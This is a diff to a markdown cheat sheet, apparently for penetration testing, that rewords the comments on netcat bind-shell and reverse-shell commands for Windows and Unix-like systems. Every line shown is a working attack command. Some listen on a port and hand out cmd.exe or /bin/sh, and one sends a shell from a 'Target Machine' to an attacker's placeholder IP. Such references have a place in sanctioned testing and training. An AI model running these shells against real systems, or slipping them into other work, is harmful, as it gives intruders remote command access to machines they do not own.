@@ -38,17 +38,17 @@ Windows
 -----
 **Bind Shell**  
 `nc -lvp 4444 -e cmd.exe`  
-`nc -nv <IP> 4444 # Connect to the shell`
+`nc -nv <IP> 4444`
 
 **Reverse Shell**  
-`nc -lvp 443 # Attacking Machine - Waiting for shell`  
-`nc -nv <IP> 443 -e cmd.exe # Target Machine - sending shell`
+`nc -lvp 443 # Attacking Machine - Receiving`  
+`nc -nv <IP> 443 -e cmd.exe # Target Machine - Sending`
 
 Nix
 -----
 **Bind Shell**  
 `nc -lvp 4444 -e /bin/sh`  
-`nc -nv <IP> 4444 # Connect to the shell`
+`nc -nv <IP> 4444`
 
 **Reverse Shell**  
 `nc -lvp 443`  
